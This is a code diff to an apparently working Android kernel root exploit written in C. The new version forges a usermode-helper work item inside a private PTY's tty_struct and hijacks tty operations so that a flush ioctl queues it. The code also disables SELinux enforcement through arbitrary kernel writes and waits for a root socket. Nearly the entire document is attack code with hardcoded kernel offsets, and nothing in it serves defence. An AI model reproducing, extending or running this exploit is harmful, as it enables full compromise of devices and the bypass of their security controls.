@@ -1,44 +1,63 @@
 /*
- * Queues a usermode-helper work item through system_unbound_wq. Prepares the
- * work structures in controlled memory, updates workqueue state, wakes a
- * worker, and waits for the root socket.
+ * Starts the root usermode helper through the kernel's native workqueue path.
+ * A private PTY supplies a disposable work_struct and an indirect do_SAK()
+ * call with the correct CFI signature. The kernel owns all queue locking and
+ * accounting; no global workqueue lists or counters are modified here.
  */
 #define _GNU_SOURCE
+#include <errno.h>
 #include <fcntl.h>
 #include <stddef.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <sys/un.h>
+#include <termios.h>
 #include <unistd.h>
 
 #include "08_ashmem_configfs_rw.h"
-#include "90_diagnostic_checkpoint.h"
 #include "09_pipe_buffer_rw.h"
 #include "10_workqueue_umh_root.h"
+#include "90_diagnostic_checkpoint.h"
 
 #define SELINUX_ENFORCING_OFF 0x02d8e5c0ULL
-#define SYSTEM_UNBOUND_WQ_OFF 0x02a90800ULL
+#define INIT_TASK_OFF 0x02c05080ULL
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL
-#define WQ_DFL_PWQ_OFF 0xb0
-#define PWQ_POOL_OFF 0x00
-#define PWQ_WQ_OFF 0x08
-#define PWQ_WORK_COLOR_OFF 0x10
-#define PWQ_REFCNT_OFF 0x18
-#define PWQ_NR_IN_FLIGHT_OFF 0x1c
-#define PWQ_NR_ACTIVE_OFF 0x5c
-#define PWQ_MAX_ACTIVE_OFF 0x60
-#define POOL_WORKLIST_OFF 0x20
-#define POOL_NR_IDLE_OFF 0x34
-#define WORK_DATA_OFF 0x00
-#define WORK_ENTRY_OFF 0x08
-#define WORK_FUNC_OFF 0x18
-#define ROOT_UMH_WORK_OFF 0x6000ULL
+#define DO_SAK_WORK_OFF 0x00bb5f14ULL
+#define DO_SAK_OFF 0x00bb8728ULL
+
+#define TASK_TASKS_OFF 0x4d0ULL
+#define TASK_PID_OFF 0x5d8ULL
+#define TASK_FILES_OFF 0x7d8ULL
+#define FILES_FDT_OFF 0x20ULL
+#define FDTABLE_MAX_FDS_OFF 0x00ULL
+#define FDTABLE_FD_OFF 0x08ULL
+#define FILE_PRIVATE_DATA_OFF 0xd8ULL
+#define TTY_FILE_TTY_OFF 0x00ULL
+#define TTY_FILE_FILE_OFF 0x08ULL
+
+#define TTY_MAGIC_OFF 0x00ULL
+#define TTY_OPS_OFF 0x18ULL
+#define TTY_INDEX_OFF 0x20ULL
+#define TTY_SAK_WORK_OFF 0x2f8ULL
+#define TTY_PORT_OFF 0x328ULL
+#define TTY_MAGIC 0x5401U
+#define TTY_OPS_SIZE 0x118U
+#define TTY_OPS_FLUSH_BUFFER_OFF 0xa8U
+
+#define WORK_DATA_OFF 0x00U
+#define WORK_ENTRY_OFF 0x08U
+#define WORK_FUNC_OFF 0x18U
+#define WORK_PENDING_BIT 0x1ULL
+
 #define ROOT_UMH_DATA_OFF 0x6200ULL
+#define ROOT_TTY_OPS_OFF 0x6400ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END 0xffffff9000000000ULL
-
+#define KERNEL_IMAGE_SPAN 0x04000000ULL
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 
 struct umh_subprocess_info {
@@ -72,56 +91,81 @@ struct umh_kernel_data {
   uint64_t envp[1];
 };
 
+struct private_pty {
+  int master;
+  int slave;
+  char slave_name[128];
+};
+
+struct tty_kernel_object {
+  uint64_t file;
+  uint64_t private_data;
+  uint64_t tty;
+  uint64_t original_ops;
+  uint8_t original_tail[sizeof(struct umh_subprocess_info)];
+  uint8_t original_ops_table[TTY_OPS_SIZE];
+};
+
 _Static_assert(sizeof(struct umh_subprocess_info) == 112,
                "subprocess_info layout");
 _Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
+_Static_assert(offsetof(struct umh_subprocess_info, complete) == 48,
+               "subprocess_info complete offset");
 
 static int is_direct_ptr(uint64_t value) {
   return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
 }
 
-static int pipe_read32(int fd, uint64_t target_addr, uint32_t *value) {
-  uint64_t wide = 0;
-  if (!oss_pipe_rw_read(fd, target_addr, &wide, sizeof(wide))) {
-    return 0;
-  }
-  *value = (uint32_t)wide;
-  return 1;
+static int is_kernel_image_ptr(uint64_t value, uint64_t kernel_base) {
+  return value >= kernel_base && value < kernel_base + KERNEL_IMAGE_SPAN;
 }
 
-static int pipe_write32(int fd, uint64_t target_addr, uint32_t value) {
-  return oss_pipe_rw_write(fd, target_addr, &value, sizeof(value));
+static uint64_t load_u64(const void *buffer, size_t offset) {
+  uint64_t value = 0;
+  memcpy(&value, (const uint8_t *)buffer + offset, sizeof(value));
+  return value;
+}
+
+static void store_u64(void *buffer, size_t offset, uint64_t value) {
+  memcpy((uint8_t *)buffer + offset, &value, sizeof(value));
+}
+
+static int pipe_read32(int fd, uint64_t target_addr, uint32_t *value) {
+  return oss_pipe_rw_read(fd, target_addr, value, sizeof(*value));
 }
 
 static int pipe_read64(int fd, uint64_t target_addr, uint64_t *value) {
   return oss_pipe_rw_read(fd, target_addr, value, sizeof(*value));
 }
 
-static int wake_system_unbound(void) {
-  char slave_name[128];
-  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
-  if (master_fd < 0 || grantpt(master_fd) != 0 || unlockpt(master_fd) != 0 ||
-      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
-    if (master_fd >= 0) {
-      close(master_fd);
-    }
+static int pipe_write64(int fd, uint64_t target_addr, uint64_t value) {
+  return oss_pipe_rw_write(fd, target_addr, &value, sizeof(value));
+}
+
+static int open_private_pty(struct private_pty *pty) {
+  memset(pty, 0, sizeof(*pty));
+  pty->master = -1;
+  pty->slave = -1;
+  pty->master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
+  if (pty->master < 0 || grantpt(pty->master) != 0 ||
+      unlockpt(pty->master) != 0 ||
+      ptsname_r(pty->master, pty->slave_name, sizeof(pty->slave_name)) != 0) {
     return 0;
   }
-  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
-  if (slave_fd < 0) {
-    close(master_fd);
-    return 0;
-  }
-  int master_close = close(master_fd);
-  int slave_close = close(slave_fd);
-  return master_close == 0 && slave_close == 0;
+  pty->slave = open(pty->slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
+  return pty->slave >= 0;
+}
+
+static void close_private_pty(struct private_pty *pty) {
+  if (pty->slave >= 0) close(pty->slave);
+  if (pty->master >= 0) close(pty->master);
+  pty->slave = -1;
+  pty->master = -1;
 }
 
 static int root_socket_ready(void) {
   int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
-  if (fd < 0) {
-    return 0;
-  }
+  if (fd < 0) return 0;
   struct sockaddr_un sun;
   memset(&sun, 0, sizeof(sun));
   sun.sun_family = AF_UNIX;
@@ -131,40 +175,118 @@ static int root_socket_ready(void) {
   return ready;
 }
 
-struct workqueue_snapshot {
-  uint64_t list_next;
-  uint64_t list_prev;
-  uint64_t pwq_pool;
-  uint64_t pwq_wq;
-  uint32_t nr_idle;
-  uint32_t color;
-  uint32_t refcnt;
-  uint32_t nr_inflight;
-  uint32_t nr_active;
-  uint32_t max_active;
-};
+static uint64_t find_current_task(int fd, uint64_t kernel_base) {
+  uint64_t list_head = kernel_base + INIT_TASK_OFF + TASK_TASKS_OFF;
+  uint64_t node = oss_kernel_read64(fd, list_head + sizeof(uint64_t));
+  pid_t wanted = getpid();
+  for (int walked = 0; walked < 16384; walked++) {
+    if (!is_direct_ptr(node) || node == list_head) break;
+    uint64_t task = node - TASK_TASKS_OFF;
+    uint32_t pid = 0;
+    uint64_t previous = 0;
+    if (!pipe_read32(fd, task + TASK_PID_OFF, &pid) ||
+        !pipe_read64(fd, task + TASK_TASKS_OFF + sizeof(uint64_t), &previous)) {
+      break;
+    }
+    if ((pid_t)pid == wanted) return task;
+    node = previous;
+  }
+  return 0;
+}
 
-static int read_workqueue_snapshot(int fd, uint64_t wq, uint64_t pwq,
-                                   uint64_t pool,
-                                   struct workqueue_snapshot *snapshot) {
-  memset(snapshot, 0, sizeof(*snapshot));
-  uint64_t worklist = pool + POOL_WORKLIST_OFF;
-  if (!pipe_read64(fd, worklist, &snapshot->list_next) ||
-      !pipe_read64(fd, worklist + sizeof(uint64_t), &snapshot->list_prev) ||
-      !pipe_read64(fd, pwq + PWQ_POOL_OFF, &snapshot->pwq_pool) ||
-      !pipe_read64(fd, pwq + PWQ_WQ_OFF, &snapshot->pwq_wq) ||
-      !pipe_read32(fd, pool + POOL_NR_IDLE_OFF, &snapshot->nr_idle) ||
-      !pipe_read32(fd, pwq + PWQ_WORK_COLOR_OFF, &snapshot->color) ||
-      !pipe_read32(fd, pwq + PWQ_REFCNT_OFF, &snapshot->refcnt) ||
-      !pipe_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &snapshot->nr_active) ||
-      !pipe_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &snapshot->max_active) ||
-      snapshot->color >= 16 || snapshot->pwq_pool != pool ||
-      snapshot->pwq_wq != wq) {
+static int resolve_tty_object(int fd, uint64_t kernel_base, int tty_fd,
+                              struct tty_kernel_object *object) {
+  memset(object, 0, sizeof(*object));
+  uint64_t task = find_current_task(fd, kernel_base);
+  uint64_t files = 0, fdt = 0, fd_array = 0;
+  uint32_t max_fds = 0;
+  if (!task || !pipe_read64(fd, task + TASK_FILES_OFF, &files) ||
+      !is_direct_ptr(files) || !pipe_read64(fd, files + FILES_FDT_OFF, &fdt) ||
+      !is_direct_ptr(fdt) ||
+      !pipe_read32(fd, fdt + FDTABLE_MAX_FDS_OFF, &max_fds) ||
+      tty_fd < 0 || (uint32_t)tty_fd >= max_fds ||
+      !pipe_read64(fd, fdt + FDTABLE_FD_OFF, &fd_array) ||
+      !is_direct_ptr(fd_array) ||
+      !pipe_read64(fd, fd_array + (uint64_t)tty_fd * sizeof(uint64_t),
+                   &object->file) ||
+      !is_direct_ptr(object->file) ||
+      !pipe_read64(fd, object->file + FILE_PRIVATE_DATA_OFF,
+                   &object->private_data) ||
+      !is_direct_ptr(object->private_data) ||
+      !pipe_read64(fd, object->private_data + TTY_FILE_TTY_OFF, &object->tty) ||
+      !is_direct_ptr(object->tty)) {
     return 0;
   }
-  uint64_t inflight_addr =
-      pwq + PWQ_NR_IN_FLIGHT_OFF + snapshot->color * sizeof(uint32_t);
-  return pipe_read32(fd, inflight_addr, &snapshot->nr_inflight);
+
+  uint64_t private_file = 0;
+  uint32_t magic = 0, index = 0;
+  uint64_t port = 0;
+  if (!pipe_read64(fd, object->private_data + TTY_FILE_FILE_OFF,
+                   &private_file) ||
+      private_file != object->file ||
+      !pipe_read32(fd, object->tty + TTY_MAGIC_OFF, &magic) ||
+      magic != TTY_MAGIC ||
+      !pipe_read32(fd, object->tty + TTY_INDEX_OFF, &index) || index > 4095 ||
+      !pipe_read64(fd, object->tty + TTY_OPS_OFF, &object->original_ops) ||
+      !is_kernel_image_ptr(object->original_ops, kernel_base) ||
+      !pipe_read64(fd, object->tty + TTY_PORT_OFF, &port) ||
+      !is_direct_ptr(port) ||
+      !oss_pipe_rw_read(fd, object->tty + TTY_SAK_WORK_OFF,
+                        object->original_tail,
+                        sizeof(object->original_tail)) ||
+      !oss_kernel_read(fd, object->original_ops, object->original_ops_table,
+                       sizeof(object->original_ops_table))) {
+    return 0;
+  }
+
+  uint64_t work_addr = object->tty + TTY_SAK_WORK_OFF;
+  uint64_t entry_addr = work_addr + WORK_ENTRY_OFF;
+  uint64_t work_data = load_u64(object->original_tail, WORK_DATA_OFF);
+  uint64_t entry_next = load_u64(object->original_tail, WORK_ENTRY_OFF);
+  uint64_t entry_prev =
+      load_u64(object->original_tail, WORK_ENTRY_OFF + sizeof(uint64_t));
+  uint64_t work_func = load_u64(object->original_tail, WORK_FUNC_OFF);
+  if ((work_data & WORK_PENDING_BIT) != 0 || entry_next != entry_addr ||
+      entry_prev != entry_addr || work_func != kernel_base + DO_SAK_WORK_OFF) {
+    fprintf(stderr,
+            "[root_umh] private PTY SAK work rejected data=%016llx "
+            "entry=%016llx/%016llx func=%016llx\n",
+            (unsigned long long)work_data, (unsigned long long)entry_next,
+            (unsigned long long)entry_prev, (unsigned long long)work_func);
+    return 0;
+  }
+  return 1;
+}
+
+static int restore_tty_object(int fd, const struct tty_kernel_object *object,
+                              int restore_ops, int restore_tail) {
+  int ok = 1;
+  if (restore_ops &&
+      !pipe_write64(fd, object->tty + TTY_OPS_OFF, object->original_ops)) {
+    ok = 0;
+  }
+  if (restore_tail &&
+      !oss_pipe_rw_write(fd, object->tty + TTY_SAK_WORK_OFF,
+                         object->original_tail,
+                         sizeof(object->original_tail))) {
+    ok = 0;
+  }
+  if (!ok) return 0;
+
+  uint64_t ops = 0;
+  uint8_t tail[sizeof(object->original_tail)];
+  if (restore_ops &&
+      (!pipe_read64(fd, object->tty + TTY_OPS_OFF, &ops) ||
+       ops != object->original_ops)) {
+    return 0;
+  }
+  if (restore_tail &&
+      (!oss_pipe_rw_read(fd, object->tty + TTY_SAK_WORK_OFF, tail,
+                         sizeof(tail)) ||
+       memcmp(tail, object->original_tail, sizeof(tail)) != 0)) {
+    return 0;
+  }
+  return 1;
 }
 
 int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
@@ -172,21 +294,41 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
                                 const char *root_umh_path,
                                 int32_t *kernel_state,
                                 int32_t irreversible_state) {
-  uint64_t selinux_addr = kernel_base + SELINUX_ENFORCING_OFF;
-  uint8_t permissive = 0;
-  uint64_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
-  uint64_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
+  struct private_pty pty;
+  struct tty_kernel_object tty_object;
   struct umh_kernel_data umh_data;
-  memset(&umh_data, 0, sizeof(umh_data));
+  struct umh_subprocess_info fake;
+  uint8_t fake_ops[TTY_OPS_SIZE];
+  uint8_t original_selinux = 1;
+  int selinux_changed = 0;
+  int ops_published = 0;
+  int tail_published = 0;
+  int work_may_be_queued = 0;
+  int safe_to_close = 0;
+  int result = 0;
 
+  if (!open_private_pty(&pty)) {
+    fprintf(stderr, "[root_umh] private PTY open failed errno=%d\n", errno);
+    close_private_pty(&pty);
+    return 0;
+  }
+  if (!resolve_tty_object(fd, kernel_base, pty.slave, &tty_object)) {
+    fprintf(stderr, "[root_umh] private PTY kernel object resolution failed\n");
+    close_private_pty(&pty);
+    return 0;
+  }
+
+  memset(&umh_data, 0, sizeof(umh_data));
   if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
       (int)sizeof(umh_data.path)) {
     fprintf(stderr, "[root_umh] helper path too long\n");
+    close_private_pty(&pty);
     return 0;
   }
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
   snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
 
+  uint64_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
   uint64_t completion_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, completion);
   uint64_t wait_list_addr =
@@ -203,219 +345,90 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
   umh_data.argv[2] = uid_addr;
   umh_data.argv[3] = 0;
   umh_data.envp[0] = 0;
-  uint64_t umh_work_func = kernel_base + CALL_USERMODEHELPER_EXEC_WORK_OFF;
 
-  unlink(ROOT_SOCKET_PATH);
-  if (!oss_kernel_write(fd, selinux_addr, &permissive, sizeof(permissive))) {
-    fprintf(stderr, "[root_umh] selinux write failed\n");
-    return 0;
-  }
-
-  uint64_t wq_slot = kernel_base + SYSTEM_UNBOUND_WQ_OFF;
-  uint64_t wq = oss_kernel_read64(fd, wq_slot);
-  if (!is_direct_ptr(wq)) {
-    fprintf(stderr, "[root_umh] bad workqueue wq=%016llx\n",
-            (unsigned long long)wq);
-    return 0;
-  }
-  uint64_t pwq = 0;
-  if (!pipe_read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq) ||
-      !is_direct_ptr(pwq)) {
-    fprintf(stderr, "[root_umh] bad workqueue pwq=%016llx\n",
-            (unsigned long long)pwq);
-    return 0;
-  }
-  uint64_t pool = 0;
-  if (!pipe_read64(fd, pwq + PWQ_POOL_OFF, &pool) ||
-      !is_direct_ptr(pool)) {
-    fprintf(stderr, "[root_umh] bad workqueue pool=%016llx\n",
-            (unsigned long long)pool);
-    return 0;
-  }
-  uint64_t pwq_wq = 0;
-  if (!pipe_read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq) || pwq_wq != wq) {
-    fprintf(stderr,
-            "[root_umh] bad workqueue wq=%016llx pwq=%016llx pool=%016llx "
-            "pwq_wq=%016llx\n",
-            (unsigned long long)wq, (unsigned long long)pwq,
-            (unsigned long long)pool, (unsigned long long)pwq_wq);
-    return 0;
-  }
-
-  uint64_t worklist = pool + POOL_WORKLIST_OFF;
-  uint64_t list_next = 0, list_prev = 0;
-  uint32_t nr_idle = 0;
-  for (int i = 0; i < 200; i++) {
-    if (!pipe_read64(fd, worklist, &list_next) ||
-        !pipe_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
-        !pipe_read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle)) {
-      fprintf(stderr, "[root_umh] worklist read failed\n");
-      return 0;
-    }
-    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
-      break;
-    }
-    usleep(1000);
-  }
-  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
-    fprintf(stderr, "[root_umh] pool busy list=%016llx/%016llx idle=%u\n",
-            (unsigned long long)list_next, (unsigned long long)list_prev,
-            nr_idle);
-    return 0;
-  }
-
-  uint64_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
-  struct umh_subprocess_info fake;
-  memset(&fake, 0, sizeof(fake));
-  uint32_t color = 0, refcnt = 0, nr_active = 0, max_active = 0;
-  if (!pipe_read32(fd, pwq + PWQ_WORK_COLOR_OFF, &color) ||
-      !pipe_read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
-      !pipe_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
-      !pipe_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active) || color >= 16 ||
-      refcnt == 0 || nr_active >= max_active) {
-    fprintf(stderr, "[root_umh] bad pwq state color=%u refcnt=%u active=%u/%u\n",
-            color, refcnt, nr_active, max_active);
-    return 0;
-  }
-
-  uint64_t inflight_addr =
-      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
-  uint32_t nr_inflight = 0;
-  if (!pipe_read32(fd, inflight_addr, &nr_inflight)) {
-    fprintf(stderr, "[root_umh] inflight counter read failed\n");
-    return 0;
-  }
-
-  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
-  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
-  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
-  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t), &worklist,
-         sizeof(worklist));
-  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));
+  memcpy(&fake, tty_object.original_tail, sizeof(fake));
+  store_u64(fake.work, WORK_FUNC_OFF,
+            kernel_base + CALL_USERMODEHELPER_EXEC_WORK_OFF);
   fake.complete = completion_addr;
   fake.path = path_addr;
   fake.argv = argv_addr;
   fake.envp = envp_addr;
+  fake.wait = 0;
+  fake.retval = 0;
+  fake.init = 0;
+  fake.cleanup = 0;
+  fake.data = 0;
 
-  int data_write = oss_pipe_rw_write(fd, umh_data_addr, &umh_data,
-                                     sizeof(umh_data));
-  if (!data_write) {
-    fprintf(stderr, "[root_umh] subprocess data write failed\n");
-    return 0;
-  }
-  int work_write =
-      oss_pipe_rw_write(fd, fake_work_addr, &fake, sizeof(fake));
-  if (!work_write) {
-    fprintf(stderr, "[root_umh] work item write failed\n");
-    return 0;
-  }
+  memcpy(fake_ops, tty_object.original_ops_table, sizeof(fake_ops));
+  store_u64(fake_ops, TTY_OPS_FLUSH_BUFFER_OFF, kernel_base + DO_SAK_OFF);
 
-  oss_diag_checkpoint("umh-prepublish-snapshot");
-  struct workqueue_snapshot snapshot_a = {0}, snapshot_b = {0},
-                            snapshot_c = {0};
-  int stable_snapshot = 0;
-  for (int i = 0; i < 200; i++) {
-    if (read_workqueue_snapshot(fd, wq, pwq, pool, &snapshot_a) &&
-        (usleep(1000), 1) &&
-        read_workqueue_snapshot(fd, wq, pwq, pool, &snapshot_b) &&
-        (usleep(1000), 1) &&
-        read_workqueue_snapshot(fd, wq, pwq, pool, &snapshot_c) &&
-        memcmp(&snapshot_a, &snapshot_b, sizeof(snapshot_a)) == 0 &&
-        memcmp(&snapshot_b, &snapshot_c, sizeof(snapshot_b)) == 0 &&
-        snapshot_c.list_next == worklist &&
-        snapshot_c.list_prev == worklist && snapshot_c.nr_idle > 0 &&
-        snapshot_c.color == color && snapshot_c.refcnt == refcnt &&
-        snapshot_c.nr_inflight == nr_inflight &&
-        snapshot_c.nr_active == nr_active &&
-        snapshot_c.max_active == max_active && nr_active < max_active) {
-      stable_snapshot = 1;
-      break;
-    }
-    usleep(1000);
-  }
-  if (!stable_snapshot) {
-    fprintf(stderr,
-            "[root_umh] unstable snapshot before publish "
-            "list=%016llx/%016llx idle=%u color=%u counters=%u/%u/%u\n",
-            (unsigned long long)snapshot_c.list_next,
-            (unsigned long long)snapshot_c.list_prev, snapshot_c.nr_idle,
-            snapshot_c.color, snapshot_c.nr_inflight, snapshot_c.nr_active,
-            snapshot_c.refcnt);
+  uint64_t fake_ops_addr = page_base + ROOT_TTY_OPS_OFF;
+  uint64_t selinux_addr = kernel_base + SELINUX_ENFORCING_OFF;
+  unlink(ROOT_SOCKET_PATH);
+  if (!oss_kernel_read(fd, selinux_addr, &original_selinux,
+                       sizeof(original_selinux)) ||
+      original_selinux > 1 ||
+      !oss_pipe_rw_write(fd, umh_data_addr, &umh_data, sizeof(umh_data)) ||
+      !oss_pipe_rw_write(fd, fake_ops_addr, fake_ops, sizeof(fake_ops))) {
+    fprintf(stderr, "[root_umh] private PTY staging failed\n");
+    close_private_pty(&pty);
     return 0;
   }
 
-  /* From the first live counter-write attempt onward, the target may have
-   * changed even when pipe-buffer restoration makes the primitive report
-   * failure. Publish the terminal state first; no rollback below is safe
-   * against a kworker concurrently consuming the partially queued item. */
   if (kernel_state) {
     __atomic_store_n(kernel_state, irreversible_state, __ATOMIC_RELEASE);
   }
-  int inflight_write = pipe_write32(fd, inflight_addr, nr_inflight + 1);
-  if (!inflight_write) {
-    fprintf(stderr, "[root_umh] inflight counter write failed\n");
-    return 0;
+  tail_published = 1;
+  if (!oss_pipe_rw_write(fd, tty_object.tty + TTY_SAK_WORK_OFF, &fake,
+                         sizeof(fake))) {
+    fprintf(stderr, "[root_umh] private PTY subprocess publish failed\n");
+    goto out;
   }
-  int active_write = pipe_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1);
-  if (!active_write) {
-    fprintf(stderr, "[root_umh] active counter write failed\n");
-    return 0;
+  ops_published = 1;
+  if (!pipe_write64(fd, tty_object.tty + TTY_OPS_OFF, fake_ops_addr)) {
+    fprintf(stderr, "[root_umh] private PTY ops publish failed\n");
+    goto out;
   }
-  int refcnt_write = pipe_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
-  if (!refcnt_write) {
-    fprintf(stderr, "[root_umh] refcount write failed\n");
-    return 0;
+
+  uint8_t permissive = 0;
+  selinux_changed = original_selinux != permissive;
+  if (!oss_kernel_write(fd, selinux_addr, &permissive, sizeof(permissive))) {
+    fprintf(stderr, "[root_umh] selinux write failed\n");
+    goto out;
   }
-  int counters_write = 1;
-  /* worklist.next (pool+0x20) and worklist.prev (pool+0x28) are adjacent
-   * list_head links. One 16-byte pipe write avoids a second forge/write/restore
-   * round trip and shortens the interval between updates. The kernel copy is
-   * not guaranteed atomic; a concurrent worker could still see one updated
-   * link before the other. */
-  uint64_t worklist_links[2] = {fake_entry, fake_entry};
-  int list_write =
-      oss_pipe_rw_write(fd, worklist, worklist_links, sizeof(worklist_links));
-  if (!list_write) {
-    /* The target copy may have partially completed even if pipe-buffer
-     * restoration reported failure; the list may already be mutated and a
-     * concurrent worker may have observed it, so blind rollback is unsafe.
-     * Treat the list write as irreversible. */
-    fprintf(stderr, "[root_umh] worklist link write failed\n");
-    return 0;
+  oss_diag_checkpoint("umh-pty-prequeue");
+
+  errno = 0;
+  int ioctl_result = ioctl(pty.slave, TCFLSH, TCOFLUSH);
+  work_may_be_queued = ioctl_result == 0;
+  int ioctl_error = ioctl_result == 0 ? 0 : errno;
+  int ops_restored = restore_tty_object(fd, &tty_object, 1, 0);
+  if (ops_restored) ops_published = 0;
+  if (ioctl_result != 0 || !ops_restored) {
+    fprintf(stderr,
+            "[root_umh] private PTY queue failed ioctl=%d errno=%d "
+            "ops_restore=%d\n",
+            ioctl_result, ioctl_error, ops_restored);
+    if (ioctl_result != 0 && ops_restored &&
+        restore_tty_object(fd, &tty_object, 0, 1)) {
+      tail_published = 0;
+      safe_to_close = 1;
+    }
+    goto out;
   }
-  int wake_ok = wake_system_unbound();
-  fprintf(stderr,
-          "[root_umh] queued wq=%016llx pwq=%016llx pool=%016llx work=%016llx "
-          "entry=%016llx color=%u counters=%u/%u/%u writes=%d/%d/%d/%d/%d "
-          "pre_list=%016llx/%016llx pre_idle=%u pre_counters=%u/%u/%u\n",
-          (unsigned long long)wq, (unsigned long long)pwq,
-          (unsigned long long)pool, (unsigned long long)fake_work_addr,
-          (unsigned long long)fake_entry, color, nr_inflight, nr_active,
-          refcnt, data_write, work_write, counters_write, list_write,
-          list_write, (unsigned long long)snapshot_c.list_next,
-          (unsigned long long)snapshot_c.list_prev, snapshot_c.nr_idle,
-          snapshot_c.nr_inflight, snapshot_c.nr_active, snapshot_c.refcnt);
-  oss_diag_checkpoint("umh-queued");
+
   uint32_t complete_done = 0;
-  for (int i = 0; i < 8 && !complete_done; i++) {
-    if (i != 0) {
-      wake_ok |= wake_system_unbound();
+  for (int i = 0; i < 5000 && !complete_done; i++) {
+    if (!pipe_read32(fd, completion_addr, &complete_done)) {
+      fprintf(stderr, "[root_umh] completion read failed\n");
+      goto out;
     }
-    for (int j = 0; j < 250; j++) {
-      if (!pipe_read32(fd, completion_addr, &complete_done)) {
-        fprintf(stderr, "[root_umh] completion read failed\n");
-        return 0;
-      }
-      if (complete_done) {
-        break;
-      }
-      usleep(1000);
-    }
+    if (!complete_done) usleep(1000);
   }
 
   int socket_ok = 0;
   if (complete_done) {
-    for (int i = 0; i < 200; i++) {
+    for (int i = 0; i < 500; i++) {
       if (root_socket_ready()) {
         socket_ok = 1;
         break;
@@ -424,10 +437,47 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
     }
   }
 
-  fprintf(stderr, "[root_umh] result wake=%d complete=%u socket=%d\n", wake_ok,
-          complete_done, socket_ok);
-  oss_diag_checkpoint(socket_ok ? "umh-root-socket-ok" : "umh-root-socket-miss");
-  return socket_ok;
+  int tail_restored = 0;
+  if (complete_done) {
+    tail_restored = restore_tty_object(fd, &tty_object, 0, 1);
+    if (tail_restored) {
+      tail_published = 0;
+      safe_to_close = 1;
+    }
+  }
+  fprintf(stderr,
+          "[root_umh] native PTY work tty=%016llx work=%016llx "
+          "complete=%u socket=%d restore=%d\n",
+          (unsigned long long)tty_object.tty,
+          (unsigned long long)(tty_object.tty + TTY_SAK_WORK_OFF),
+          complete_done, socket_ok, tail_restored);
+  result = socket_ok && tail_restored;
+
+out:
+  if (ops_published && restore_tty_object(fd, &tty_object, 1, 0)) {
+    ops_published = 0;
+  }
+  if (tail_published && !work_may_be_queued &&
+      restore_tty_object(fd, &tty_object, 0, 1)) {
+    tail_published = 0;
+  }
+  if (!tail_published) safe_to_close = 1;
+  if (!result && selinux_changed) {
+    int restored = oss_kernel_write(fd, selinux_addr, &original_selinux,
+                                    sizeof(original_selinux));
+    fprintf(stderr, "[root_umh] selinux restore=%d value=%u\n", restored,
+            original_selinux);
+  }
+  if (safe_to_close && !ops_published) {
+    close_private_pty(&pty);
+  } else {
+    fprintf(stderr,
+            "[root_umh] private PTY pinned after unsafe restoration state "
+            "ops=%d tail=%d fds=%d/%d\n",
+            ops_published, tail_published, pty.master, pty.slave);
+  }
+  oss_diag_checkpoint(result ? "umh-root-socket-ok" : "umh-root-socket-miss");
+  return result;
 }
 
 int root_umh_install_fd(int fd, uint64_t kernel_base, uint64_t page_base,
@@ -444,8 +494,7 @@ int root_umh_install(uint64_t kernel_base, uint64_t page_base,
     return 0;
   }
   uint64_t ashmem_misc_fops_addr = kernel_base + 0x02bfcf28ULL;
-  int verified =
-      oss_verify_kernel_access(fd, ashmem_misc_fops_addr, page_base);
+  int verified = oss_verify_kernel_access(fd, ashmem_misc_fops_addr, page_base);
   int pipe_ready = verified && oss_pipe_rw_install(fd, kernel_base, page_base);
   int rooted = pipe_ready &&
                root_umh_install_fd(fd, kernel_base, page_base, root_umh_path);
